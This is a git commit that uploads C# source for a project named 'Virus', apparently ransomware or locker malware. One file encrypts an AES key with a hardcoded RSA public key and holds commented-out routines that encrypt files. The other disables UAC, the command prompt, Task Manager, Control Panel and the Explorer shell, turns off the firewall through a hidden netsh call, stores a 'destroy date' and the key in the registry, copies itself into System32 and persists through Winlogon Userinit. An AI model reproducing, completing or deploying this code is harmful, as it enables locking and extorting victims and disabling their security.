b98735c9544386e49db4217aee12bb715b153e7b
Rory Cox <75227102+rorycox21@users.noreply.github.com>
2021-07-25 23:03:29 +0100

    Add files via upload

---
+++ Virus/RSAencryption.cs
@@ -0,0 +1,96 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading.Tasks;
+using System.Web;
+
+namespace Virus
+{
+    class RSAencryption
+    {
+        //TODO Remove  && !f.Contains(".ignore") from this document.
+        private static string _publicKey = "<RSAKeyValue><Modulus>sL6H9+sJ+ZeQLZX1b5d107lRFHrS0jWdXs9M2En/IilG9xTWHJstuPt13aq9QgDB/2tdi7SYLIIfqD5trNgViEK3/+45g71KQ1NZaiUaVVTweFINBkBqBlycCpPeQi0QljK1cLNunSWHF9zuU//RkUMC3jR4RIw1BR1Zo2qu/lFC9ektctXpGePZk2BEQ8xHg0oTgFF5MH8se8eM85Jc1rsHuxAwiTcjQ5ekBH14rgDtZiXTwDclAMXWM1sz9H2o7yRuBhdpaN4YL0tvGyEAuMcPulDA2QF7OhjIOG7q02VBQVGGXYxk9WukJ10Zg0/O17oEcal2nkLoA5lslUVXuQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
+        private static UnicodeEncoding _encoder = new UnicodeEncoding();
+
+        public static string Encrypt(string textToEncrypt)
+        {
+            var bytesToEncrypt = Encoding.UTF8.GetBytes(textToEncrypt);
+
+            using (var rsa = new RSACryptoServiceProvider(2048))
+            {
+                try
+                {
+                    rsa.FromXmlString(_publicKey.ToString());
+                    var encryptedData = rsa.Encrypt(bytesToEncrypt, true);
+                    var base64Encrypted = Convert.ToBase64String(encryptedData);
+                    return base64Encrypted;
+                }
+                finally
+                {
+                    rsa.PersistKeyInCsp = false;
+                }
+            }
+        }//Used to encrypt AES key
+        public static string Decrypt(string textToDecrypt, string privateKeyString)
+        {
+            var bytesToDescrypt = Encoding.UTF8.GetBytes(textToDecrypt);
+
+            using (var rsa = new RSACryptoServiceProvider(2048))
+            {
+                try
+                {
+                    // server decrypting data with private key
+                    rsa.FromXmlString(privateKeyString);
+
+                    var resultBytes = Convert.FromBase64String(textToDecrypt);
+                    var decryptedBytes = rsa.Decrypt(resultBytes, true);
+                    var decryptedData = Encoding.UTF8.GetString(decryptedBytes);
+                    return decryptedData.ToString();
+                }
+                finally
+                {
+                    rsa.PersistKeyInCsp = false;
+                }
+            }
+        }//Used to decrypt AES key
+
+        #region commented (Not using)
+        //private static byte[] DecryptBytes(byte[] bytesToDecrypt, string privkey)
+        //{
+        //    var rsa = new RSACryptoServiceProvider();
+        //    rsa.FromXmlString(privkey); //pass in privkey and sell copy of _privateKey
+        //    var decryptedByte = rsa.Decrypt(bytesToDecrypt, false);
+        //    return decryptedByte;
+        //}
+        //private static void DecryptFile(string encryptedFilePath, string privkey)
+        //{
+        //    byte[] encryptedBytes = File.ReadAllBytes(encryptedFilePath);
+        //    byte[] decryptedBytes = DecryptBytes(encryptedBytes, privkey);
+        //    string newPath = encryptedFilePath.Replace("_encryptedExtension", "");
+        //    File.WriteAllBytes(newPath, decryptedBytes);
+        //}
+
+
+        //private static byte[] EncryptBytes(byte[] bytesToEncrypt, string pubkey)
+        //{
+        //    var rsa = new RSACryptoServiceProvider();
+        //    rsa.FromXmlString(pubkey);
+        //    var encryptedByteArray = rsa.Encrypt(bytesToEncrypt, false).ToArray();
+
+        //    return encryptedByteArray;
+        //}
+        //private static bool EncryptFile(string toBeEncryptedFullPath, string pubkey)
+        //{
+        //    byte[] rawBytes = File.ReadAllBytes(toBeEncryptedFullPath);
+        //    byte[] encryptedBytes = EncryptBytes(rawBytes, pubkey);
+        //    string newPath = toBeEncryptedFullPath + "_encryptedExtension";   // Path.ChangeExtension(toBeEncryptedFullPath, ".encrypt");
+        //    File.WriteAllBytes(newPath, encryptedBytes);
+        //    return true;
+
+        //}
+        #endregion
+    }
+}
---
+++ Virus/RegHelpers.cs
@@ -0,0 +1,358 @@
+﻿using Microsoft.Win32;
+using System;
+using System.IO;
+using System.Reflection;
+using System.Windows.Forms;
+
+namespace Virus
+{
+    class RegHelpers
+    {
+        public static void LimitUserAccess()
+        {
+            DisableWindowsDefender();   //WORKING
+            DisableWallpaper();
+            DisableFileExplorer();
+            DisableUAC();
+            DisableCMD();
+            DisableTaskMgr();
+            DisableControlPanel();
+
+
+        }
+        public static void RemoveLimitedAccess()
+        {
+            EnableWindowsDefender();
+            EnableUAC();
+            EnableCMD();
+            EnableTaskMgr();
+            EnableControlPanel();
+            DeleteDestroyDate();
+            EnableFileExplorer();
+        }
+
+        private static void DisableUAC(bool reset = false)   //user account control 
+        {
+            RegistryKey reg2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+            if (reset)
+            {
+                reg2.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
+            }
+            else
+            {
+                reg2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
+            }
+            reg2.Close();
+        }
+        private static void DisableCMD(bool reset = false)
+        {
+            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
+            if (reset && reg2.GetValue("DisableCMD") != null)
+            {
+                reg2.DeleteValue("DisableCMD");
+            }
+            else
+            {
+                reg2.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
+            }
+            reg2.Close();
+        }
+        private static void DisableTaskMgr(bool reset = false)
+        {
+            RegistryKey reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+
+            if (reset && reg.GetValue("DisableTaskMgr") != null)
+            {
+                reg.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
+            }
+            else
+            {
+                reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
+            }
+            reg.Close();
+        }
+        private static void DisableControlPanel(bool reset = false)
+        {
+            RegistryKey reg1 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
+            if (reset)
+            {
+                reg1.SetValue("NoControlPanel", 0, RegistryValueKind.DWord);
+            }
+            else
+            {
+                reg1.SetValue("NoCtrlDisp", 1, RegistryValueKind.DWord);
+                reg1.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
+            }
+            reg1.Close();
+        }
+        private static bool DisableWallpaper()
+        {
+            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
+
+            if (reg.GetValue("Wallpaper").ToString() != "")
+            {
+                reg.SetValue("Wallpaper", "", RegistryValueKind.String);
+            }
+            else { return false; }
+            reg.Close();
+            return true;
+        }
+        private static bool DisableFileExplorer()
+        {
+            RegistryKey reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
+
+            if (reg.GetValue("Shell").ToString() != "")
+            {
+                reg.SetValue("Shell", "", RegistryValueKind.String);
+            }
+            else { return false; }
+            reg.Close();
+            return true;
+        }
+
+        private static void EnableCMD()
+        {
+            DisableCMD(true);
+
+        }
+        private static void EnableTaskMgr()
+        {
+            DisableTaskMgr(true);
+        }
+        private static void EnableControlPanel()
+        {
+            DisableControlPanel(true);
+        }
+        private static void EnableUAC()
+        {
+            DisableUAC(true);
+        }
+        private static bool EnableFileExplorer()
+        {
+            RegistryKey reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
+
+            if (reg.GetValue("Shell").ToString() == "")
+            {
+                reg.SetValue("Shell", "Explorer.exe", RegistryValueKind.String);
+            }
+            else { return false; }
+            reg.Close();
+            return true;
+        }
+
+        public static bool SetDestroyDate(DateTime ddate)
+        {
+            string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
+            string AppPath = Application.ExecutablePath;
+            string AppVersion = "1.0";
+            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);
+
+            key.CreateSubKey(AppTitle);
+            key = key.OpenSubKey(AppTitle, true);
+
+
+            key.CreateSubKey(AppVersion);
+            key = key.OpenSubKey(AppVersion, true);
+
+            key.SetValue("exp", ddate);
+            key.Close();
+            return true;
+
+        }
+        public static string GetDestroyDate()
+        {
+
+            string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
+            string AppPath = Application.ExecutablePath;
+            string AppVersion = "1.0";
+            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);
+
+            key.CreateSubKey(AppTitle);
+            var key1 = key.OpenSubKey(AppTitle, true); //open
+
+            key1.CreateSubKey(AppVersion);   //open
+
+            var key2 = key1.OpenSubKey(AppVersion, true);
+
+            key.Close();
+            key1.Close();
+
+            var x = key2.GetValue("exp");
+            if (x != null)
+            {
+                key2.Close();
+                return x.ToString();
+            }
+            return null;
+
+        }
+        public static bool DeleteDestroyDate()
+        {
+            string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
+            string AppPath = Application.ExecutablePath;
+            string AppVersion = "1.0";
+            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);
+
+            key.CreateSubKey(AppTitle);
+            var key1 = key.OpenSubKey(AppTitle, true); //open
+
+            key1.CreateSubKey(AppVersion);   //open
+
+            var key2 = key1.OpenSubKey(AppVersion, true);
+
+            key.Close();
+            key1.Close();
+
+            var x = key2.GetValue("exp");
+            if (x != null)
+            {
+                key2.DeleteValue("exp");
+                key2.Close();
+                return true;
+            }
+            return false;
+        }
+
+        public static bool SetAESkey(string toSave)
+        {
+            string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
+            string AppPath = Application.ExecutablePath;
+            string AppVersion = "1.0";
+            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);
+
+            key.CreateSubKey(AppTitle);
+            key = key.OpenSubKey(AppTitle, true);
+
+
+            key.CreateSubKey(AppVersion);
+            key = key.OpenSubKey(AppVersion, true);
+
+            key.SetValue("aes", toSave);
+            key.Close();
+            return true;
+
+        }
+        public static string GetAESkey()
+        {
+            string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
+            string AppPath = Application.ExecutablePath;
+            string AppVersion = "1.0";
+            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);
+
+            key.CreateSubKey(AppTitle);
+            var key1 = key.OpenSubKey(AppTitle, true); //open
+
+            key1.CreateSubKey(AppVersion);   //open
+
+            var key2 = key1.OpenSubKey(AppVersion, true);
+
+            key.Close();
+            key1.Close();
+
+            var x = key2.GetValue("aes");
+            if (x != null)
+            {
+                key2.Close();
+                return x.ToString();
+            }
+            return null;
+
+        }
+        public static bool DeleteAESkey()
+        {
+            string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
+            string AppPath = Application.ExecutablePath;
+            string AppVersion = "1.0";
+            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);
+
+            key.CreateSubKey(AppTitle);
+            var key1 = key.OpenSubKey(AppTitle, true); //open
+
+            key1.CreateSubKey(AppVersion);   //open
+
+            var key2 = key1.OpenSubKey(AppVersion, true);
+
+            key.Close();
+            key1.Close();
+
+            var x = key2.GetValue("aes");
+            if (x != null)
+            {
+                key2.DeleteValue("aes");
+                key2.Close(); 
+                return true;
+            }
+            return false;
+        }
+
+        public static bool IsAvailableForAllUsers()
+        {
+            string pathStartUp = "C:\\Windows\\System32";
+            if (!Directory.Exists(pathStartUp))
+            {
+                return false;
+            }
+            var exe = Assembly.GetExecutingAssembly().Location;
+            var destiny = Path.Combine(pathStartUp, Path.GetFileName(exe));
+            if (exe == destiny)
+            {
+                return true;
+            }
+            return false;
+        }
+        public static bool MakeAvailableForAllUsers()
+        {
+            string pathStartUp = "C:\\Windows\\System32";
+            if (!Directory.Exists(pathStartUp))
+            {
+                File.Create(pathStartUp).Close();
+
+            }
+            var exe = Assembly.GetExecutingAssembly().Location;
+            var destiny = Path.Combine(pathStartUp, Path.GetFileName(exe));
+            if (exe != destiny)
+            {
+                var data = File.ReadAllBytes(exe);
+                File.WriteAllBytes(destiny, data);
+            }
+            return true;
+
+
+
+        }   //todo work on this
+
+        private static void DisableWindowsDefender()
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = "/C NetSh Advfirewall set allprofiles state off";
+            process.StartInfo = startInfo;
+            process.Start();
+        }
+        private static void EnableWindowsDefender()
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = "/C NetSh Advfirewall set allprofiles state on";
+            process.StartInfo = startInfo;
+            process.Start();
+        }
+
+        private static void AddToStartupReg()
+        {
+            string AppTitle = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
+            string AppPath = Application.ExecutablePath;
+            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
+
+            string x = key.GetValue("Userinit").ToString();
+            key.SetValue("Userinit", $"{x},{AppPath}", RegistryValueKind.String);
+            key.Close();
+        }
+
+        
+    }
+}
